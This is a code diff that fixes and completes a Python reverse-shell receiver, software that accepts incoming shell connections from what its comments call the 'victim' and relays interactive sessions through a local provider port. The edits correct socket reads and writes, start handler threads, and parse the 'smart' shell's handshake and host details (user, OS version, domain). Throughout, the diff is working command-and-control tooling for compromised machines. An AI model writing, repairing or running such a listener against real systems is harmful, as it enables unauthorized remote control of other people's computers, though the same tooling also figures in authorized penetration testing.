@@ -12,8 +12,7 @@ T_DICT = 1
 
 class ReverseShell(threading.Thread):
     # a random string
-    SHELL_HELLO = ''.join([chr(int(x, 16)) for x in
-                           "21 9e 10 55 75 6a 1a 6b".split()]).encode()
+    SHELL_HELLO = bytes([0x21, 0x9e, 0x10, 0x55, 0x75, 0x6a, 0x1a, 0x6b])
 
     def __init__(self, sock, key=None):
         super(ReverseShell, self).__init__()
@@ -23,20 +22,19 @@ class ReverseShell(threading.Thread):
         self.rsock = sock  # the remote socket connected to the victim
         self.lsock = None  # the local socket for shell interaction
         self.key = key
+        self.log = []
         self.get_shell_hello()
         host, port = sock.getpeername()
         self.details["peer_host"] = host
         self.details["peer_port"] = port
-        self.description = "[%(id)s] %(user)s@%(hostname)s " + \
-                           "(%(peer_host)s:%(peer_id)d)" % self.details
-        self.log = []
+        self.description = ("[%(id)s] %(user)s@%(hostname)s "
+                            "(%(peer_host)s:%(peer_port)d)") % self.details
         self.read_socks = [self.rsock]
         self.write_socks = []
         self.queue = {
             self.rsock: []
         }
         self.active = True
-        self.run()
 
     def set_lsock(self, sock):
         #  if not self.lsock:
@@ -56,20 +54,22 @@ class ReverseShell(threading.Thread):
         r, _, _ = select.select([self.rsock], [], [])
         firstbytes = r[0].recv(8, socket.MSG_PEEK)
         if firstbytes == self.SHELL_HELLO:  # or rc4(shell_hello) TODO
-            r.recv(8)
+            r[0].recv(8)
             p = self.read_shell_packet(self.rsock)
             self.shell_type = 'smart'
-            self.details = p["data"]
+            self.details.update(p["data"])
+            print(self.details)
         else:
             self.shell_type = 'dumb'
-            for key in ["user", "host", "ps_version", "arch"]:
+            for key in ["user", "host", "ps_version", "os_version",
+                        "arch", "domain"]:
                 self.details[key] = '?'
 
     def write_shell_packet(self, p, s):
         """Convert a ShellPacket to a byte string and send it across the
         wire"""
 
-        s.write(p.serialize())
+        s.send(p.serialize())
         p.set_delivered()
         self.queue[s].remove(p)
 
@@ -122,7 +122,7 @@ class ReverseShell(threading.Thread):
 
     def run(self):
         while self.active:
-            r, w, _ = select.select(self.read_socks, self.write_socks, [], 60)
+            r, w, _ = select.select(self.read_socks, self.write_socks, [], 1)
             for s in r:
                 self.read_shell_packet(s)
             for s in w:
@@ -144,7 +144,7 @@ class ShellPacket(object):
     def __init__(self, packet_type, body):
         if packet_type == T_JSON:
             self.json = json.loads(body.decode())
-        if packet_type == T_DICT:
+        elif packet_type == T_DICT:
             self.json = body
         else:
             raise Exception
@@ -221,8 +221,10 @@ class ShellPacket(object):
                 self.bcolors.ENDC,
             )
         elif self["msg_type"] == "SHELL_HELLO":
-            for key, val in self.json:
-                return ("%s:\t%s\n" % key, val)
+            result = ""
+            for key, val in self.json["data"].items():
+                result += "%s:\t%s\n" % (key, val)
+            return result
         else:
             return ""
 
@@ -243,7 +245,10 @@ class ShellReceiver(object):
         self.rsock.listen(128)
         while True:
             connection, addr = self.rsock.accept()
-            self.shells += ReverseShell(connection)
+            rs = ReverseShell(connection)
+            self.shells.append(rs)
+            print(self.shells)
+            rs.start()
 
     def run_provider(self, host='127.0.0.1', port=18157):
         """Provides a service where you can interact with caught shells"""
@@ -251,12 +256,15 @@ class ShellReceiver(object):
         self.lsock.bind((host, port))
         self.lsock.listen(128)
         while True:
-            connection, addr = self.rsock.accept()
+            connection, addr = self.lsock.accept()
             r, _, _ = select.select([connection], [], [])
-            id = r.recv(8)
-            peer_shell = [s for s in self.shells if s.details["id"] == id]
+            id = connection.recv(8)
+            peer_shell = [s for s in self.shells if s.details["id"] ==
+                          id.decode()]
             if not peer_shell:
+                connection.close()
                 raise Exception
             if len(peer_shell) > 1:
+                connection.close()
                 raise Exception
             peer_shell[0].set_lsock(connection)
